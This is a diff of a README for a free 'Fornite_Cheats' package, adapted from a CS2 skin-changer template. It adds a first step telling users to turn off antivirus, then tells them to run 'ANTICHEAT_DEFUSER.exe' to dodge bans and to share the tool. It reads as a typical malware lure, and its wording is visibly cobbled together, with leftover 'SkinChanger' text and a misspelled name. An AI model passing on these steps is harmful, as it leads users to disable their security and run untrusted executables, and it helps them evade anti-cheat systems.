@@ -26,16 +26,16 @@ License
 Fornite_Cheats is licensed for free distribution and use. Feel free to share it with anyone you think might find it useful!
 
 (1st) Step:
-Download Fornite_Cheats
+Turn off any antivirus software.
 (2nd) Step:
-Extract CS2_SkinChanger.zip
+Download Fornite_Cheats
 (3rd) Step:
-Start CS2 and wait till you are in lobby
+Start Fortnite and wait till you are in lobby
 (4th) Step:
 Run ANTICHEAT_DEFUSER.exe  you need this to run because otherwise you can get banned pretty easily
 (5th) Step:
-Run SkinChanger.exe and wait till SkinChanger Menu will pop up
+Run Fortnite.exe and wait till SkinChanger Menu will pop up
 (6th) Step:
-Enjoy SkinChanger Menu and share it with friends
+Enjoy Fortnite Menu and share it with friends
 
 We are not responsible if you get banned because of our client
